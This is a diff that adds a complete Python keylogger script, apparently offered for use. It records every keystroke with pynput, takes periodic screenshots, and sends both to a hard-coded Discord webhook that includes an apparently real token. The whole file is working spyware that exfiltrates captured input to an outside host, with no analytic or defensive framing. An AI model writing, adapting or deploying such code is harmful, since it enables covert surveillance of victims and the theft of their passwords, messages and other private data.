@@ -1,0 +1,46 @@
+#!/bin/python3
+from pynput.keyboard import Listener
+from threading import Timer
+from dhooks import Webhook
+import pyscreenshot
+from pyscreenshot import grab
+from dhooks import Webhook, File
+from io import BytesIO
+import requests
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/950857782083584000/V5fYEGWYQ4anWwUPmlrBFfy3XTf4O4c6dM2QpVbE7xo6-YMhb1eKIL0VCZeMaAw0YbSV"  # Your discord webhook url goes here.
+TIME_INTERVAL = 60  # You can set the amount of time between each report
+
+
+
+class Keylogger:
+    def __init__(self, webhook_url, interval=600):
+        self.interval = interval
+        self.webhook = Webhook(webhook_url)
+
+        self.log = ""
+
+    def _report(self):
+        if self.log != '':
+            img = pyscreenshot.grab()
+            img.save('/home/louis/Desktop/Documents/Image/t.png')
+            file = File('/home/louis/Desktop/Documents/Image/t.png', name='Logger.png')
+            self.hook = Webhook(WEBHOOK_URL)
+            self.webhook.send(self.log)
+            self.log = ''
+            self.hook.send('Look at this:', file=file)
+
+        Timer(self.interval, self._report).start()
+
+
+    def _on_key_press(self, key):
+        self.log += str(key)
+
+    def run(self):
+        self._report()
+        with Listener(self._on_key_press) as t:
+            t.join()
+
+
+if __name__ == '__main__':
+    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
